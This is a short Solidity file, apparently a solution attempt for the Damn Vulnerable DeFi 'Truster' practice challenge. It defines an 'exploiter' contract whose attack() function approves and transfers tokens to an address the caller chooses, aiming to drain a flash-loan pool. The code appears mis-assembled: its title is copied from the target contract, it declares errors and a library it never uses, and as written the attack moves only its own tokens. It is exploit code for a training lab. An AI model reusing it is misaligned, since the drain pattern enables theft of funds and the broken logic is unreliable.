// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";

interface IRektable {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPoolExploiter is ReentrancyGuard {
    using Address for address;

    IERC20 public immutable damnValuableToken;
    address private immutable _attacker;

    error NotBadGuy();
    error FlashLoanHasNotBeenPaidBack();

    constructor(address tokenAddress, address attacker_) {
        damnValuableToken = IERC20(tokenAddress);
        _attacker = attacker_;
    }

    function attack(address to, uint256 amount) external {
        damnValuableToken.approve(to, amount);
        damnValuableToken.transfer(to, amount);
    }
}
